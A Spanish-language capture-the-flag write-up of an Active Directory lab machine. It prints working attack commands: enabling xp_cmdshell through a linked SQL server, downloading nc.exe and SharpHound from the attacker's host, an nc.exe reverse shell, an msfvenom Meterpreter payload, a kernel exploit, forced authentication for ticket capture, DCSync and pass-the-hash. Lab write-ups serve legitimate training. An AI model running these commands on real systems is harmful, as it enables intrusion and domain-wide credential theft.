![](../Assets/Attachments/Pasted%20image%2020260420131033.png)

Credenciales proporcionadas -> john.w / RFulUtONCOL!

![Pasted image 20260401121628](../Assets/Attachments/Pasted%20image%2020260401121628.png)

escaneo en busca de puertos abiertos
![Pasted image 20260401121715](../Assets/Attachments/Pasted%20image%2020260401121715.png)

![Pasted image 20260401122105](../Assets/Attachments/Pasted%20image%2020260401122105.png)

escaneo más exhaustivo sobre los puertos previamente identificados, con el objetivo de detectar los servicios en ejecución y sus versiones, y lanzar scripts NSE por defecto para obtener información adicional de cada servicio.
![Pasted image 20260401121936](../Assets/Attachments/Pasted%20image%2020260401121936.png)

![Pasted image 20260401122506](../Assets/Attachments/Pasted%20image%2020260401122506.png)

![Pasted image 20260401122521](../Assets/Attachments/Pasted%20image%2020260401122521.png)

Puertos mas interesantes:
	WinRM (5985)
	SQL Server 2022 (1433)
	Kerberos (88) y LDAP (389/636)
	Global Catalog (3268/3269)



Dado que la máquina objetivo no es accesible a través de un DNS público, se añade la resolución de forma manual en `/etc/hosts`. Esto permite que las herramientas utilizadas durante la resolucion de la maquina (como `nxc`, `rpcclient`, `impacket`, etc.) resuelvan correctamente tanto el dominio como el hostname del controlador de dominio, evitando errores de resolución durante las pruebas.

![Pasted image 20260401123131](../Assets/Attachments/Pasted%20image%2020260401123131.png)

Credenciales válidas pero no se trata de un usuario privilegiado.

![Pasted image 20260401123345](../Assets/Attachments/Pasted%20image%2020260401123345.png)

una vez verificado que las credenciales son validas identificamos que recursos compartidos a nivel de red son accesibles con este usuario, de esta forma podemos determinar si existen shares con permisos de escritura que podamos aprovechar, en este caso no encontramos nada en shares
![Pasted image 20260401123429](../Assets/Attachments/Pasted%20image%2020260401123429.png)

usamos rpcclient para comprobar si el usuario tiene capacidad de realizar consultas ldap/rpc sin necesitar privilegios elevados, lo que nos permite enumerar usuarios, grupos del dominio
![Pasted image 20260401124724](../Assets/Attachments/Pasted%20image%2020260401124724.png)

![Pasted image 20260401124801](../Assets/Attachments/Pasted%20image%2020260401124801.png)

![Pasted image 20260401124811](../Assets/Attachments/Pasted%20image%2020260401124811.png)

![Pasted image 20260401124931](../Assets/Attachments/Pasted%20image%2020260401124931.png)

Filtramos únicamente los usuarios del dominio al archivo `users` para posteriormente comprobar si alguno es AS-REP Roasteable, aunque solamente tenemos al usuario `john.w`.

![Pasted image 20260401125244](../Assets/Attachments/Pasted%20image%2020260401125244.png)

Pero nos da error de primeras.

![Pasted image 20260401130646](../Assets/Attachments/Pasted%20image%2020260401130646.png)

Al forzarlo a que se conecte directamente a la IP del DC podemos ver que no hay ningún usuario AS-REP-Roasteable.

![Pasted image 20260401130727](../Assets/Attachments/Pasted%20image%2020260401130727.png)

Comprobamos si algún usuario es Kerberoasteable.

![Pasted image 20260401125750](../Assets/Attachments/Pasted%20image%2020260401125750.png)

Nos da error. Hacemos lo mismo, pero esta vez forzamos a la herramienta a conectarse directamente a la dirección IP del Controlador de Dominio (DC) en lugar de depender únicamente de la resolución de DNS.

![Pasted image 20260401125852](../Assets/Attachments/Pasted%20image%2020260401125852.png)

Pero nada.

Además de `rpcclient` también probamos a volcar los datos del dominio vía LDAP para enumerar mejor.

![Pasted image 20260401135539](../Assets/Attachments/Pasted%20image%2020260401135539.png)

El Controlador de Dominio nos rechaza la conexión porque estamos intentando enviar las credenciales en texto plano y exige conexión segura (LDAPS). Probando alternativas:

![Pasted image 20260401141539](../Assets/Attachments/Pasted%20image%2020260401141539.png)

El error ocurre porque esta versión de `ldapdomaindump` no reconoce bien el parámetro `-S` para forzar SSL/TLS. En lugar de pasarle solo la IP, especificamos el protocolo seguro y el puerto **636** directamente en el host:

![Pasted image 20260401140525](../Assets/Attachments/Pasted%20image%2020260401140525.png)

![Pasted image 20260401141715](../Assets/Attachments/Pasted%20image%2020260401141715.png)

Ojo, aquí dentro del grupo _Forest Trust Accounts_ vemos al usuario `darkzero-ext$`, esto parece ser una cuenta de máquina.

![Pasted image 20260401142129](../Assets/Attachments/Pasted%20image%2020260401142129.png)

Vamos a usar `bloodhound-python` para ver permisos, etc.

![Pasted image 20260401142556](../Assets/Attachments/Pasted%20image%2020260401142556.png)

Levantamos Bloodhound:

![Pasted image 20260401142614](../Assets/Attachments/Pasted%20image%2020260401142614.png)

Volcamos la información del dominio en un zip que subiremos a Bloodhound:

![Pasted image 20260401142635](../Assets/Attachments/Pasted%20image%2020260401142635.png)

Vemos la contraseña:

![Pasted image 20260401142850](../Assets/Attachments/Pasted%20image%2020260401142850.png)

Al subirlo me sale _partially completed_ y al ir a _Explore_ no me deja buscar nada, por lo tanto pensamos que esta no es la vía de entrada.

![Pasted image 20260401143357](../Assets/Attachments/Pasted%20image%2020260401143357.png)

![Pasted image 20260401143444](../Assets/Attachments/Pasted%20image%2020260401143444.png)

![Pasted image 20260401143454](../Assets/Attachments/Pasted%20image%2020260401143454.png)

Ahora vamos a ver qué podemos hacer con MSSQL.

OJO, parece ser que con las credenciales que tenemos ahora podemos acceder a MSSQL. Vemos que somos el usuario `john.w` pero estamos como invitados, además ahora mismo nos encontramos en la base de datos llamada `master`.

![Pasted image 20260401143717](../Assets/Attachments/Pasted%20image%2020260401143717.png)

Enumeramos MSSQL. Vamos a proceder a comprobar qué privilegios tenemos pero no tiene buena pinta:

![Pasted image 20260401144922](../Assets/Attachments/Pasted%20image%2020260401144922.png)

SQL

```
SELECT SYSTEM_USER;
-- Returns: darkzero\john.w

SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns: 0 (not sysadmin)

SELECT IS_MEMBER('db_owner');
-- Returns: 0 (not database owner)
```

Vamos a intentar un UNC Path Injection por si capturamos el hash NTLMv2 y... bien, hemos capturado el log de autenticación pero nada, imposible de crackear porque al tener el signo `$` se trata de una cuenta de máquina.

![Pasted image 20260401145914](../Assets/Attachments/Pasted%20image%2020260401145914.png)

![Pasted image 20260401145941](../Assets/Attachments/Pasted%20image%2020260401145941.png)

![Pasted image 20260401145949](../Assets/Attachments/Pasted%20image%2020260401145949.png)

Intentamos un ataque de NTLM Relay pero no recibimos nada, usamos LDAPS porque se usa SSL (esto ya lo vimos en el escaneo con nmap, puerto 636).

![Pasted image 20260401151701](../Assets/Attachments/Pasted%20image%2020260401151701.png)

En este caso no va a funcionar.

![Pasted image 20260401153648](../Assets/Attachments/Pasted%20image%2020260401153648.png)

Intentamos volcar los secretos (DCSync):

![Pasted image 20260401195730](../Assets/Attachments/Pasted%20image%2020260401195730.png)

Al seguir enumerando con la ayuda de Hackviser, encontramos que hay un servidor vinculado llamado `DC02.darkzero.ext`:

![Pasted image 20260401201220](../Assets/Attachments/Pasted%20image%2020260401201220.png)

Sabiendo esto, rápidamente probamos la conexión de este Linked Server:

`SELECT * FROM OPENQUERY([DC02.darkzero.ext], 'SELECT @@version');`

Nos sale _server is not configured for DATA ACCESS_, esto quiere decir que la configuración del servidor tiene esta opción deshabilitada. PERO puede que `RPC OUT` (Remote Procedure Call Out) esté habilitado y podamos ejecutar consultas y procedimientos almacenados en el servidor remoto.

![Pasted image 20260401201344](../Assets/Attachments/Pasted%20image%2020260401201344.png)

Comprobamos si `RPC OUT` y `POOM` están habilitados.

![Pasted image 20260401201559](../Assets/Attachments/Pasted%20image%2020260401201559.png)

Sabiendo que `RPC OUT` está habilitado vamos a explotar este vector.

Comprobamos privilegios en DC02. Vamos a ejecutar este comando para ver nuestro usuario y a su vez comprobar si tenemos rol de administrador del sistema (`sysadmin`).

¡Y efectivamente somos sysadmin!

`EXEC ('SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(''sysadmin'');') AT [DC02.darkzero.ext];`

![Pasted image 20260401202007](../Assets/Attachments/Pasted%20image%2020260401202007.png)

Sabiendo que somos sysadmin vamos a intentar habilitar ejecución de comandos. Habilitamos `xp_cmdshell` para lograr RCE en el sistema:

Activamos opciones avanzadas:

`EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];`

Activamos consola:

`EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];`

![Pasted image 20260401202502](../Assets/Attachments/Pasted%20image%2020260401202502.png)

Ahora sí, vamos a ejecutar comandos del sistema operativo usando `xp_cmdshell` empaquetado dentro de la instrucción `EXEC AT`.

Vamos a ver sobre qué cuenta de usuario está corriendo el MSSQL Server en el servidor DC02:

`EXEC ('xp_cmdshell ''whoami /all''') AT [DC02.darkzero.ext];`

Nos salen muchas cosas, pero si subimos podremos ver el username y el SID:

`darkzero-ext\svc_sql S-1-5-21-1969715525-31638512-2552845157-1103`

![Pasted image 20260401203001](../Assets/Attachments/Pasted%20image%2020260401203001.png)

Además, no tenemos privilegios interesantes como `SeImpersonatePrivilege`.

![Pasted image 20260401204236](../Assets/Attachments/Pasted%20image%2020260401204236.png)

Teniendo esto, es el momento de obtener una reverse shell interactiva.

Levantamos un servidor en Python por el puerto 8000 en el directorio donde tengamos el `nc.exe` de Windows:

![Pasted image 20260401204418](../Assets/Attachments/Pasted%20image%2020260401204418.png)

En otra terminal ponemos a netcat en escucha para que reciba la reverse shell:

![Pasted image 20260401204554](../Assets/Attachments/Pasted%20image%2020260401204554.png)

Descargamos el binario `nc.exe` en DC02 usando nuestro RCE:

`EXEC ('xp_cmdshell ''curl http://<TU_IP_VPN>:8000/nc.exe -o C:\Windows\Temp\nc.exe''') AT [DC02.darkzero.ext];`

![Pasted image 20260401204715](../Assets/Attachments/Pasted%20image%2020260401204715.png)

Por último, ejecutamos el binario `nc.exe` para que se conecte de vuelta a nosotros:

`EXEC ('xp_cmdshell ''C:\Windows\Temp\nc.exe -e cmd.exe <TU_IP_VPN> 4444''') AT [DC02.darkzero.ext];`

![Pasted image 20260401204811](../Assets/Attachments/Pasted%20image%2020260401204811.png)

Si todo ha salido bien, la consulta se quedará cargando y recibiremos la conexión en la terminal de netcat. ¡SÍ!

![Pasted image 20260401204919](../Assets/Attachments/Pasted%20image%2020260401204919.png)

Una vez dentro, enumeramos un poco. Al ser una cuenta de dominio, `svc_sql` puede consultar el Active Directory (LDAP). Es probable que la cuenta tenga permisos abusables sobre otros usuarios o equipos.

Para no perder tiempo, vamos a subir `SharpHound.exe` a `C:\Windows\Temp\` para mapear el dominio, y nos descargaremos el zip resultante para analizarlo en BloodHound.

`certutil -urlcache -split -f http://10.10.14.49:8000/SharpHound.exe C://Windows/Temp/SharpHound.exe`

![Pasted image 20260401211618](../Assets/Attachments/Pasted%20image%2020260401211618.png)

En `C:\Windows\Temp`, al terminar SharpHound de mapear no podemos ver el nombre del archivo, así que vamos a lanzarlo de nuevo indicándole que guarde el output en otro lugar, como `C:\Users\Public`:

![Pasted image 20260401213556](../Assets/Attachments/Pasted%20image%2020260401213556.png)

![Pasted image 20260401213836](../Assets/Attachments/Pasted%20image%2020260401213836.png)

`.\SharpHound.exe --outputdirectory C:\Users\Public\`

Ejecutamos de nuevo el binario y ahora sí ya podemos ver el .zip.

![Pasted image 20260401213918](../Assets/Attachments/Pasted%20image%2020260401213918.png)

Nos pasamos el .zip a nuestra máquina host, en este caso usando netcat.

![Pasted image 20260401220203](../Assets/Attachments/Pasted%20image%2020260401220203.png)

![Pasted image 20260401220213](../Assets/Attachments/Pasted%20image%2020260401220213.png)

![Pasted image 20260401220233](../Assets/Attachments/Pasted%20image%2020260401220233.png)

Subimos el .zip a Bloodhound, pero nos sale el mismo error de _partially completed_, por lo que este no es el camino.

Vamos a tirar WinPEAS para agilizar la enumeración local. Rápidamente vemos que tenemos **Microsoft Windows Server 2022 version 10.0.20348 build 20348**. Esta compilación específica tiene vulnerabilidades conocidas (TOCTOU) que podemos probar.

![Pasted image 20260403123042](../Assets/Attachments/Pasted%20image%2020260403123042.png)

![Pasted image 20260403123806](../Assets/Attachments/Pasted%20image%2020260403123806.png)

![Pasted image 20260403123829](../Assets/Attachments/Pasted%20image%2020260403123829.png)

Revisando el volcado de WinPEAS, confirmamos la compilación `10.0.20348 Build 20348`. Esta versión es vulnerable a **CVE-2024-30088**, una vulnerabilidad de condición de carrera en el kernel que da permisos directos de `SYSTEM`.

**Paso 1: Crear el payload de Meterpreter**

Dado que tenemos una shell tonta de Netcat, necesitamos un binario que devuelva una sesión de Meterpreter para poder usar el exploit local de Metasploit.

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP_VPN> LPORT=5555 -f exe -o meterpreter.exe`

![Pasted image 20260403183016](../Assets/Attachments/Pasted%20image%2020260403183016.png)

**Paso 2: Preparar el Listener en Metasploit**

Iniciamos `msfconsole -q` y preparamos el handler:

![Pasted image 20260403183039](../Assets/Attachments/Pasted%20image%2020260403183039.png)

![Pasted image 20260403183147](../Assets/Attachments/Pasted%20image%2020260403183147.png)

**Paso 3: Subir y ejecutar el Meterpreter**

Subimos el binario a `Windows\Temp` con ayuda de `certutil` y lo ejecutamos:

![Pasted image 20260403183156](../Assets/Attachments/Pasted%20image%2020260403183156.png)

**Paso 4: Lanzar el Exploit del Kernel (CVE-2024-30088)**

En Metasploit se nos habrá abierto la sesión. La mandamos a background e interactuamos con el exploit:

![Pasted image 20260403183222](../Assets/Attachments/Pasted%20image%2020260403183222.png)

![Pasted image 20260403183232](../Assets/Attachments/Pasted%20image%2020260403183232.png)

**Paso 5: Victoria (Post-Explotación)**

Si la condición de carrera tiene éxito, ganamos una shell como `nt authority\system`.

Leemos la flag de usuario y volcamos los hashes locales del equipo (opcional pero muy recomendado).

![Pasted image 20260403130850](../Assets/Attachments/Pasted%20image%2020260403130850.png)

![Pasted image 20260403130858](../Assets/Attachments/Pasted%20image%2020260403130858.png)

---

### Cross-Forest Attack / DCSync

Al principio de la máquina, cuando hicimos el dump del dominio, vimos que la cuenta `darkzero-ext$` formaba parte del grupo _Forest Trust Accounts_. Esto significa que hay un trust entre `darkzero.htb` y `darkzero.ext`. Esta cuenta maneja la Trust Key para los tickets Kerberos entre ambos bosques.

Sabiendo esto, vamos a intentar forzar una autenticación para capturar un ticket de máquina cruzado. Usamos `Rubeus` en el DC02 (donde somos SYSTEM) para que se ponga en escucha:

![Pasted image 20260403183328](../Assets/Attachments/Pasted%20image%2020260403183328.png)

Desde nuestra shell de SQL, obligamos al DC01 a intentar leer un recurso compartido en DC02 usando `xp_dirtree`:

`EXEC xp_dirtree '\\DC02.darkzero.ext\share';`

![Pasted image 20260403183353](../Assets/Attachments/Pasted%20image%2020260403183353.png)

¡Voilá! Recibimos el TGT de la cuenta de máquina de DC01 en Rubeus.

![Pasted image 20260403181300](../Assets/Attachments/Pasted%20image%2020260403181300.png)

Al tener el ticket de la cuenta de máquina de un Controlador de Dominio (`DC01$`), inherentemente poseemos privilegios para replicar el AD (DCSync).

**Paso 1: Guardar y Decodificar el Ticket**

Copiamos el bloque en Base64 que nos soltó Rubeus, lo guardamos en un archivo en nuestra máquina atacante y lo decodificamos a formato `.kirbi`:

![Pasted image 20260403182833](../Assets/Attachments/Pasted%20image%2020260403182833.png)

**Paso 2: Convertir a formato Impacket**

Convertimos el archivo `.kirbi` a `.ccache` usando el script de Impacket:

![Pasted image 20260403182842](../Assets/Attachments/Pasted%20image%2020260403182842.png)

**Paso 3: Sincronizar y cargar el ticket**

Sincronizamos la hora con el DC y exportamos la variable de entorno `KRB5CCNAME` para que Impacket use nuestro ticket:

![Pasted image 20260403182849](../Assets/Attachments/Pasted%20image%2020260403182849.png)

![Pasted image 20260403182857](../Assets/Attachments/Pasted%20image%2020260403182857.png)

**Paso 4: El ataque DCSync**

Lanzamos `secretsdump` usando autenticación Kerberos (`-k`) para solicitar los hashes del dominio.

`impacket-secretsdump -k -no-pass darkzero.htb/DC01\$@DC01.darkzero.htb`

![Pasted image 20260403182913](../Assets/Attachments/Pasted%20image%2020260403182913.png)

**Paso 5: Pass-The-Hash y Flag Root**

Copiamos el hash NTLM del usuario Administrator que nos acaba de dumpear y usamos `psexec` para conseguir shell directa:

`impacket-psexec -hashes :<HASH_NTLM> Administrator@DC01.darkzero.htb`

![Pasted image 20260403182932](../Assets/Attachments/Pasted%20image%2020260403182932.png)

Leemos la flag de root.

![Pasted image 20260403182557](../Assets/Attachments/Pasted%20image%2020260403182557.png)
